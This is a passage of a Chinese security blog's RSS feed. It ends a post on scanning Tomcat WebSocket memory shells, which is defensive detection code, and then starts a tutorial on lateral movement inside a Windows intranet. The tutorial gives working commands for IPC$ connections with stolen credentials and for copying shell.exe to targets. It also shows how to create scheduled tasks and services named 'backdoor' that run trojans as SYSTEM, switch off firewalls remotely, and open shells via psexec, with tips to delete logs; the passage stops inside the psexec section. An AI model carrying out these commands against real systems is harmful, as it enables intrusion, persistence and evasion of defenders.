&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;kd&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;synchronized&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getEndpointConfigs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;HttpServletRequest&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;throws&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Exception&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getServletContext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getAttribute&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerContainer&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;Field&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredField&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;configExactMatchMap&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;ConcurrentHashMap&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configExactMatchMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ConcurrentHashMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_ExactPathMatch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;forName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;org.apache.tomcat.websocket.server.WsServerContainer$ExactPathMatch&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;Method&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;_ExactPathMatch&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getDeclaredMethod&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;getConfig&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;setAccessible&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;

    &lt;span class=&#34;n&#34;&gt;List&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ArrayList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;Iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configExactMatchMap&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;entrySet&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;

    &lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;hasNext&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iterator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;config&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;_getconfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;invoke&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;entry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getValue&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;());&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;


&lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;getEndpointConfigs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getPath&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClassLoader&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;classFileIsExists&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()))&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;；&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;out&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cfg&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getEndpointClass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;())));&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;已PR到：&lt;a href=&#34;https://github.com/c0ny1/java-memshell-scanner&#34;&gt;java-memshell-scanner&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;说句题外话：有一说一，用Tomcat起WebSocket服务不是那么常见，如果发现了有注册的Endpoint的话，蓝队们还需要谨慎对待。&lt;/p&gt;
&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/veo/wsMemShell&#34;&gt;WebSocket 内存马，一种新型内存马技术&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/lqzkcx3/article/details/78507169&#34;&gt;Servlet3.0研究之ServletContainerInitializer接口&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/duanxz/p/5041110.html&#34;&gt;websocket之三：Tomcat的WebSocket实现 - duanxz&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/weixin_36586120/article/details/120025498&#34;&gt;WebSocket通信原理和在Tomcat中实现源码详解&lt;/a&gt;&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/categories/note/">note</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</category>
                                
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/tags/tomcat/">Tomcat</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>内网横向移动方法</title>
                <link>https://blog.wh1sper.com/posts/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95/</link>
                <guid isPermaLink="true">https://blog.wh1sper.com/posts/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95/</guid>
                <pubDate>Wed, 01 Jun 2022 18:08:48 &#43;0800</pubDate>
                
                    <author>pwned[&lt;at&gt;]qq.com (wh1sper)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;h2 id=&#34;ipc连接&#34;&gt;IPC连接&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;条件：&lt;/p&gt;
&lt;p&gt;1、目标机开启了139和445端口；&lt;/p&gt;
&lt;p&gt;2、目标主机管理员开启了ipc$默认共享；&lt;/p&gt;
&lt;p&gt;3、知道目标机的（权限足够的）账户密码。&lt;/p&gt;
&lt;p&gt;4、NT或以上操作系统&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;IPC$(Internet Process Connection)&lt;/code&gt;是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。&lt;/p&gt;
&lt;p&gt;利用&lt;code&gt;IPC$&lt;/code&gt;,连接者甚至可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。&lt;/p&gt;
&lt;p&gt;命令：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net use \\192.168.10.2\ipc$ /user:&amp;quot;username&amp;quot; &amp;quot;password&amp;quot;
//建立ipc连接
net use \\192.168.10.2 /u:domainname\username &amp;quot;password&amp;quot;
// 域中建立ipc连接
net use \\192.168.10.2 /de /y 
// 删除ipc连接(使用完之后记得删除)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;用ipc进行文件目录操作&#34;&gt;用IPC进行文件目录操作&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net view \\192.168.10.2 
//查看共享目录
net view \\192.168.10.2\c$\users 
//列出指定目录文件
copy shell.exe \\192.168.10.2\C$\windows\temp\ 
//复制文件到目标目录
copy \\192.168.10.2\C$\windows\temp\hash.txt 
//下载文件到当前目录
net use z: \\192.168.10.2\c$ &amp;quot;密码&amp;quot; /user:&amp;quot;用户名&amp;quot;  
//将对方的c盘映射为自己的z盘
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;ipc常见错误号&#34;&gt;IPC常见错误号&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1.错误号5，拒绝访问：很可能你使用的用户不是管理员权限的，先提升权限；
2.错误号51，Windows 无法找到网络路径：网络有问题；
3.错误号53，找不到网络路径：ip地址错误；目标未开机；目标lanmanserver服务未启动；目标有防火墙（端口过滤）；
4.错误号67，找不到网络名：你的lanmanworkstation服务未启动；目标删除了ipc$；
5.错误号1219，提供的凭据与已存在的凭据集冲突：你已经和对方建立了一个ipc$，请删除再连。
6.错误号1326，未知的用户名或错误密码：原因很明显了；
7.错误号1792，试图登录，但是网络登录服务没有启动：目标NetLogon服务未启动。（连接域控会出现此情况）
8.错误号2242，此用户的密码已经过期：目标有帐号策略，强制定期要求更改密码。
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;windows计划任务&#34;&gt;Windows计划任务&lt;/h3&gt;
&lt;p&gt;1.先建立IPC连接&lt;/p&gt;
&lt;p&gt;2.确定目标主机DC的当前时间&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net time \\192.168.10.2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.拷贝木马到目标机器&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;copy shell.exe \\192.168.10.2\C$\windows\temp\
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;4	.创建计划任务&lt;/p&gt;
&lt;p&gt;Vista 和 Server 2008 之后：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在使用schtasks命令时，会在系统中留下日志文件C:\Windows\Tasks\SchedLgU.txt（记得删）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;schtasks /create /s 192.168.10.2 /tn backdoor /sc minute /mo 1  /tr c:\shell.exe /ru system /f
// 创建一个名称为&amp;quot;backdoor&amp;quot;的计划任务。该计划任务每分钟启动一次，启动程序为c:\shell.exe，启动权限为system
schtasks /run /s 192.168.10.2 /i /tn backdoor
// i：忽略任何限制立即运行任务
schtasks /delete /s 192.168.10.2 /tn &amp;quot;backdoor&amp;quot; /f
// 强制删除名称为&amp;quot;backdoor&amp;quot;计划任务（记得删）
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在没有建立ipc连接时，要加上/u和/p参数分别设置用户名(域中为&lt;code&gt;域\域用户&lt;/code&gt;)和密码。
如果因为权限或组策略设置等原因报错拒绝访问，要加上/u和/p参数分别设置高权限用户名和密码。&lt;/p&gt;
&lt;p&gt;Vista 和 Server 2008 之前：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;at \\192.168.10.2 15:47:00 c:\beacon.exe //创建计划任务
at \\192.168.10.2 1 /delete //删除ID为1的计划任务
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;windows服务&#34;&gt;Windows服务&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;条件：&lt;/p&gt;
&lt;p&gt;1、当前跳板机用户具有管理员权限(因为要创建服务)。&lt;/p&gt;
&lt;p&gt;2、与目标机器已经建立ipc连接&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;1.建立IPC连接&lt;/p&gt;
&lt;p&gt;2.拷贝木马到目标机器&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;copy shell.exe \\192.168.10.2\C$\windows\temp\
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;3.在目标主机DC上创建一个名称为“backdoor”的服务。命令如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc \\[主机名 or IP] create [servicename] binpath= &amp;quot;[path]&amp;quot;   
//创建计划任务启动程序
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意这里的格式，“=” 后面是必须空一格的，否则会出现错误。&lt;/p&gt;
&lt;p&gt;4.立即启动该服务：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc \\192.168.10.2 start bindshell
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;5.删除刚才创建的服务&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc \\192.168.10.2 delete bindshell
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们还可以通过设置服务来关闭防火墙：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sc \\WIN-ENS2VR5TR3N create unablefirewall binpath= &amp;quot;netsh advfirewall set allprofiles state off&amp;quot;
sc \\WIN-ENS2VR5TR3N start unablefirewall
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;通过smb服务横向移动&#34;&gt;通过smb服务横向移动&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;利用条件&lt;/p&gt;
&lt;p&gt;1、445端口开放&lt;/p&gt;
&lt;p&gt;2、知道账号密码明文或hash&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;利用 SMB 服务可以通过明文或 hash 传递（PTH）来远程执行。&lt;/p&gt;
&lt;h3 id=&#34;明文传递&#34;&gt;明文传递&lt;/h3&gt;
&lt;h4 id=&#34;psexecexe微软官方工具&#34;&gt;PsExec.exe(微软官方工具)&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;使用条件&lt;/p&gt;
&lt;p&gt;1.对方主机开启了 admin$ 共享，如果关闭了admin$共享，会提示：找不到网络名&lt;/p&gt;
&lt;p&gt;2.对方未开启防火墙&lt;/p&gt;
&lt;p&gt;3.如果是工作组环境，则必须使用administrator用户连接（因为要在目标主机上面创建并启动服务），使用其他账号(包括管理员组中的非administrator用户)登录都会提示访问拒绝访问。&lt;/p&gt;
&lt;p&gt;4.如果是域环境，即可用普通域用户连接也可以用域管理员用户连接。连接普通域主机可以用普通域用户，连接域控只能用域管理员账户。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;执行原理(会留下大量日志)：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过ipc$连接，释放psexecsvc.exe到目标&lt;/li&gt;
&lt;li&gt;通过服务管理SCManager远程创建psexecsvc服务，并启动服务。&lt;/li&gt;
&lt;li&gt;客户端连接执行命令，服务端启动相应的程序并执行回显数据。&lt;/li&gt;
&lt;li&gt;运行完后删除服务。这个在windows的日志中有详细的记录，另外psexec在少数情况下会出现服务没删除成功的bug，所以一般不推荐使用psexec，推荐wmiexec&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;可先建立ipc连接再使用psexec无需输入密码&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;net use \\IP /u:domainname\username password
//建立IPC通道
psexec.exe \\192.168.10.2 -s cmd.exe -acceptcula
//反弹cmd
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或者直接使用：&lt;/p&gt;
